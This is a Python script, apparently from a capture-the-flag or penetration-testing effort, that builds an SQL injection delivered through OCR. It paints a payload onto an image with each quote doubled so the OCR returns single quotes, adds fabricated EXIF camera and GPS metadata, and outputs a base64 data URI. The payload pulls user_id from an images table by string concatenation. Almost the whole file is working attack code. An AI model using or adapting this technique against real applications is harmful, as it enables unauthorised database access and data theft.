# gen_dq_theory.py — theory: painting TWO quotes ('') makes the OCR deliver ONE quote (').
# c2 was the only row that kept quotes, and it was painted with doubled quotes.
# Build probes to confirm the mapping N_painted -> N_delivered, then the real payload where
# each SQL quote is painted as a double quote.
from PIL import Image, ImageDraw, ImageFont
import piexif, base64, os

base = Image.open("paisaje.png").convert("RGB")
def build(text, path, size=34):
    W = min(1600, max(1000, 40+int(len(text)*size*0.60))); H=280
    img = base.resize((W,H)); d=ImageDraw.Draw(img)
    font=None
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: font=ImageFont.truetype(p,size); break
        except: pass
    if font is None: font=ImageFont.load_default()
    bbox=d.textbbox((20,20),text,font=font)
    d.rectangle([0,0,W,bbox[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=font,fill=(0,0,0))
    img.save(path,"jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),path)
    return "data:image/jpeg;base64,"+base64.b64encode(open(path,"rb").read()).decode()

q=chr(39)
# The winning payload with EACH sql-quote painted as a DOUBLE quote so OCR delivers a single:
# want in SQL:  '||(SELECT user_id FROM images WHERE id=1)||'
# paint:       ''||(SELECT user_id FROM images WHERE id=1)||''   (doubled at both ends)
payload_paint = q+q+"||(SELECT user_id FROM images WHERE id=1)||"+q+q
open("dqpay_datauri.txt","w").write(build(payload_paint,"dqpay.jpg"))
print("painted:", payload_paint)
print("goal in SQL after OCR halving:", q+"||(SELECT user_id FROM images WHERE id=1)||"+q)
